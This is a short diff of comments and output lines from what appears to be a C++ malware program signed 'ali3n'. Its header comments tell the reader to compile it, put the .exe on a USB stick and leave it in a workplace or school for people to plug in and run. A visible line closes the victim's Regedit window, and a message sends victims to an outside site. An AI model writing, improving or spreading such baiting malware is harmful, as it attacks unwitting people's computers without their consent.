@@ -1,8 +1,8 @@
 //This is the work of ali3n
 //Feel free to edit my code for your uses
-//But if you take credit for it, I WILL HUNT YOY DOWN AND HACK YOU
+//But if you take credit for it, I WILL HUNT YOU DOWN
 //So don't take credit for it, I worked hard for this
-//I reccomend that youe compile this code and put the EXE file on a USB
+//I reccomend that youe compile this code and put the .exe file on a USB
 //Then put leave this USB around your workplace or school and wait for people to plug it in and run the application
 
 
@@ -161,6 +161,6 @@ PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
 }
 
 Sleep(9999);
-cout<< Go to www.ali3n.co.uk/error.html<<endl;
+cout<<"Go to www.ali3n.co.uk/error.html to fix this error by yourself" <<endl;
 }
 }
